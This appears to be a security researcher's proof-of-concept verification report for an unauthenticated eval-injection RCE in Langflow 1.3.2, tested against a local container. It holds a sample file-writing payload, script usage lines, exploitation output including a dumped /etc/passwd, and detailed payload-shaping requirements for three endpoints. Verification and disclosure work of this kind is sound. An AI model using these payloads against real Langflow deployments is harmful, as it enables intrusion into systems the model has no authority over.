# PoC Verification Report: CVE-2026-0769

## Summary

| Field | Value |
|---|---|
| **CVE** | CVE-2026-0769 |
| **Title** | Langflow eval_custom_component_code Eval Injection Remote Code Execution |
| **Verification Status** | **CONFIRMED** |
| **Vectors Tested** | 4 |
| **Vectors Confirmed** | 4/4 |
| **Target** | Langflow 1.3.2 (`langflowai/langflow:1.3.2`) |
| **Container** | `cve-2026-0769-vulnerable` (127.0.0.1:7860) |
| **Authentication Required** | None (AUTO_LOGIN=True by default) |
| **Process User** | `user` (uid=1000, gid=0/root) |

## PoC Scripts

### Primary PoC: `poc.py`

| Field | Value |
|---|---|
| **Location** | `poc/poc.py` |
| **Language** | Python 3 (stdlib only) |
| **Vector** | `POST /api/v1/custom_component` — module-level exec |
| **exec() Path** | `prepare_global_scope()` at `validate.py:293` |
| **Status** | **CONFIRMED** |

**Description**: Exploits the primary vulnerability path. Obtains a superuser JWT via `GET /api/v1/auto_login` (no credentials), then sends malicious Python code to `POST /api/v1/custom_component`. The code includes module-level assignment statements containing system commands and file operations, wrapped in a required `Component` subclass. The code is exec()'d by `prepare_global_scope()` during custom component processing.

**Demonstrates**:
- Unauthenticated access via AUTO_LOGIN bypass
- Arbitrary command execution (`id`, `hostname`, `uname -a`)
- Arbitrary file write (marker file)
- Arbitrary file read (`/etc/passwd`)

**Usage**:
```bash
python3 poc.py <target_ip> <port> [container_name]
python3 poc.py 127.0.0.1 7860 cve-2026-0769-vulnerable
```

### Vector 2: `poc_vector2_classbody.py`

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector2_classbody.py` |
| **Vector** | `POST /api/v1/custom_component` — class-body exec |
| **exec() Path** | `build_class_constructor()` at `validate.py:338` |
| **Status** | **CONFIRMED** |

**Description**: Places RCE code in the **class body** (as class-level assignments) rather than at module level. This exercises a DIFFERENT `exec()` call — `build_class_constructor()` at line 338 (vs `prepare_global_scope()` at line 293). Proves both exec() calls are independently exploitable.

### Vector 3: `poc_vector3_update_endpoint.py`

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector3_update_endpoint.py` |
| **Vector** | `POST /api/v1/custom_component/update` — module-level exec |
| **exec() Path** | `prepare_global_scope()` at `validate.py:293` (same chain, different entry) |
| **Status** | **CONFIRMED** |

**Description**: Exploits the same code execution chain via an **alternative API endpoint**: `/api/v1/custom_component/update`. This endpoint (defined at `endpoints.py:675-740`) accepts the same `code` field and routes it through the same `eval_custom_component_code()` chain. Proves that multiple API entry points are vulnerable.

### Vector 4: `poc_vector4_validate_code.py`

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector4_validate_code.py` |
| **Vector** | `POST /api/v1/validate/code` — FunctionDef exec via default args |
| **exec() Path** | `validate_code()` at `validate.py:57` |
| **Status** | **CONFIRMED** |

**Description**: Exploits a **completely independent vulnerability** in the `/api/v1/validate/code` endpoint. This endpoint uses `validate_code()` which finds `ast.FunctionDef` nodes and exec()'s them at line 57. Since `exec()` on a FunctionDef only *defines* the function (doesn't call it), the function body doesn't run directly. The exploit uses **Python default argument evaluation** — default argument expressions are evaluated at function definition time (during `exec()`). The payload structure is:

```python
def exploit(
    _rce=__import__('builtins').open('/tmp/marker', 'w').write('PWNED')
):
    pass
```

This is a different code path with a different payload structure, proving the `validate_code()` function is independently exploitable via a well-known Python behavior.

## Test Results

### Vector 1: Primary PoC — CONFIRMED

**Command**:
```bash
python3 poc.py 127.0.0.1 7860 cve-2026-0769-vulnerable
```

**Output**:
```
============================================================
  CVE-2026-0769: Langflow Eval Injection RCE PoC
  Target: http://127.0.0.1:7860
  Vector: POST /api/v1/custom_component (module-level exec)
============================================================

[*] Step 1: Requesting auto_login token from http://127.0.0.1:7860/api/v1/auto_login
[+] Got superuser JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...

[*] Payload marker: CVE-2026-0769-RCE-817ee333
[*] Payload will write to: /tmp/cve-2026-0769-poc-marker
[*] Step 2: Sending malicious payload to http://127.0.0.1:7860/api/v1/custom_component
[+] Server responded with HTTP 200

[*] Step 3: Verifying exploitation...
[+] ============================================
[+]  VULNERABILITY CONFIRMED: CVE-2026-0769
[+]  Remote Code Execution via eval injection
[+] ============================================
[+]
[+] Marker: CVE-2026-0769-RCE-817ee333
[+] Marker file: /tmp/cve-2026-0769-poc-marker
[+]
[+] --- Exploit Output ---
[+] CVE-2026-0769-RCE-817ee333
[+] ---COMMAND-OUTPUT---
[+] id: uid=1000(user) gid=0(root) groups=0(root)
[+] hostname: 788062396e65
[+] uname: Linux 788062396e65 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64 GNU/Linux
[+] ---FILE-READ---
[+] root:x:0:0:root:/root:/bin/bash
[+] daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[+] bin:x:2:2:bin:/bin:/usr/sbin/nologin
[+] sys:x:3:3:sys:/dev:/usr/sbin/nologin
[+] sync:x:4:65534:sync:/bin:/bin/sync
[+] games:x:5:60:games:/usr/games:/usr/sbin/nologin
[+] man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
[+] lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
[+] mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
[+] news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
[+] uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
[+] proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
[+] www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
[+] backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
[+] list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
[+] irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
[+] _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
[+] nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
[+] user:x:1000:0::/app/data:/bin/sh

[+] --- End Output ---

[+] RESULT: VULNERABILITY CONFIRMED
[+] Unauthenticated RCE achieved on Langflow 1.3.2
[+] The exec() call in prepare_global_scope() executed attacker code
```

### Vector 2: Class-Body Exec — CONFIRMED

**Command**:
```bash
python3 poc_vector2_classbody.py 127.0.0.1 7860 cve-2026-0769-vulnerable
```

**Output**:
```
============================================================
  CVE-2026-0769 Vector 2: Class-Body Exec RCE
  Target: http://127.0.0.1:7860
  Exec path: build_class_constructor() at validate.py:338
============================================================

[*] Getting auth token...
[+] Got token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
[*] Sending class-body exploit payload...
[*] Marker: CVE-2026-0769-CLASSBODY-9c2af8c3
[+] HTTP 200 response received
[*] Verifying exploitation...
[+] =============================================
[+]  CONFIRMED: Class-body code execution works!
[+]  exec() path: build_class_constructor():338
[+] =============================================
[+] CVE-2026-0769-CLASSBODY-9c2af8c3
[+] exec_path: build_class_constructor() at validate.py:338
[+] id: uid=1000(user) gid=0(root) groups=0(root)
[+] hostname: 788062396e65
```

### Vector 3: /custom_component/update Endpoint — CONFIRMED

**Command**:
```bash
python3 poc_vector3_update_endpoint.py 127.0.0.1 7860 cve-2026-0769-vulnerable
```

**Output**:
```
============================================================
  CVE-2026-0769 Vector 3: /custom_component/update RCE
  Target: http://127.0.0.1:7860
  Endpoint: POST /api/v1/custom_component/update
============================================================

[*] Getting auth token...
[+] Got token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
[*] Sending exploit to /api/v1/custom_component/update...
[*] Marker: CVE-2026-0769-UPDATE-5603e880
[+] HTTP 200 response received
[*] Verifying exploitation...
[+] =============================================
[+]  CONFIRMED: /custom_component/update is also vulnerable!
[+] =============================================
[+] CVE-2026-0769-UPDATE-5603e880
[+] endpoint: /api/v1/custom_component/update
[+] id: uid=1000(user) gid=0(root) groups=0(root)
[+] hostname: 788062396e65
[+] whoami: user
```

### Vector 4: /validate/code Endpoint — CONFIRMED

**Command**:
```bash
python3 poc_vector4_validate_code.py 127.0.0.1 7860 cve-2026-0769-vulnerable
```

**Output**:
```
============================================================
  CVE-2026-0769 Vector 4: /validate/code RCE
  Target: http://127.0.0.1:7860
  Endpoint: POST /api/v1/validate/code
  Technique: Default argument evaluation at def-time
============================================================

[*] Getting auth token...
[+] Got token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
[*] Sending default-arg exploit to /api/v1/validate/code...
[*] Marker: CVE-2026-0769-VALIDATE-36ddf69b
[*] Technique: default argument evaluated during exec() of FunctionDef
[+] HTTP 200 response received
[+] Response: {"imports":{"errors":[]},"function":{"errors":[]}}
[*] Verifying exploitation...
[+] =============================================
[+]  CONFIRMED: /validate/code endpoint is vulnerable!
[+]  Technique: Default argument evaluation
[+]  exec() path: validate_code() at validate.py:57
[+] =============================================
[+] CVE-2026-0769-VALIDATE-36ddf69b
[+] endpoint: /api/v1/validate/code
[+] technique: default argument evaluation
[+] code_path: validate_code() exec() at validate.py:57
[+] id: uid=1000(user) gid=0(root) groups=0(root)
[+] hostname: 788062396e65
```

## Vulnerability Demonstrated

The PoC proves the following:

### 1. Unauthenticated Access
- `GET /api/v1/auto_login` returns a valid 365-day superuser JWT with **zero credentials**
- The default `AUTO_LOGIN=True` setting means any Langflow deployment is exploitable out of the box

### 2. Remote Code Execution (3 independent exec() paths)
| exec() Path | Location | Trigger |
|---|---|---|
| `prepare_global_scope()` | `validate.py:293` | Module-level assignment statements in custom component code |
| `build_class_constructor()` | `validate.py:338` | Class-body assignments in custom component code |
| `validate_code()` | `validate.py:57` | Function definition default arguments via validate endpoint |

### 3. Full System Compromise Capabilities
- **Command execution**: `subprocess.check_output()` runs arbitrary OS commands as uid=1000
- **File write**: Can write arbitrary files to the filesystem
- **File read**: Can read any file accessible by uid=1000 (including `/etc/passwd`)
- **Process context**: uid=1000 with gid=0(root) group membership — broad filesystem access

### 4. Multiple Attack Surface
Three API endpoints are independently vulnerable:
- `POST /api/v1/custom_component` — primary vector (Component subclass required)
- `POST /api/v1/custom_component/update` — alternative entry point (same exec chain)
- `POST /api/v1/validate/code` — independent code path (FunctionDef exec)

## Payload Requirements

### For `/api/v1/custom_component` and `/api/v1/custom_component/update`:
- Code must contain a class inheriting from a base with "Component" or "LC" in the name
- RCE code at module level must be **assignment statements** (`_x = os.system(...)`) — bare expressions are NOT exec()'d
- Class-body assignments also work via the separate `build_class_constructor()` exec path

### For `/api/v1/validate/code`:
- Code must contain a `def` statement (FunctionDef AST node)
- Function body does NOT execute (only defined, not called)
- Use **default argument expressions** for RCE — they evaluate at definition time during exec()
- Use `__import__()` since imports are not available in the exec() scope

## Key Technical Findings

1. **Assignment-only execution**: `prepare_global_scope()` only processes `ast.Import`, `ast.ImportFrom`, `ast.ClassDef`, `ast.FunctionDef`, and `ast.Assign` nodes. Bare expression statements like `os.system("id")` are silently ignored. Payloads must use assignment form: `_x = os.system("id")`.

2. **Default argument evaluation**: The `validate_code()` exec()'s FunctionDef nodes but doesn't call the function. However, Python evaluates default argument expressions at function definition time, providing an RCE primitive even when the function body is never invoked.

3. **Multiple independent exec() calls**: The vulnerability is not a single code path — there are at least 3 independent `exec()` calls that can be triggered via different API endpoints and different payload structures.

4. **No sandboxing whatsoever**: The exec() calls run with the full privileges of the Langflow backend process. There are no import restrictions, no AST filtering beyond syntactic validation, and no namespace isolation.

## Notes

- All PoC scripts use Python stdlib only — no external dependencies required
- Each PoC uses a unique randomly-generated marker string to avoid false positives
- PoCs clean up marker files after verification
- The container runs as `user` (uid=1000) with `gid=0(root)`, not as root — but this still provides very broad access
- This is a 0-day vulnerability — **no patch exists** as of Langflow v1.8.0 (latest release)
- The ZDI advisory (ZDI-26-035) recommends restricting interaction with the product as the only mitigation
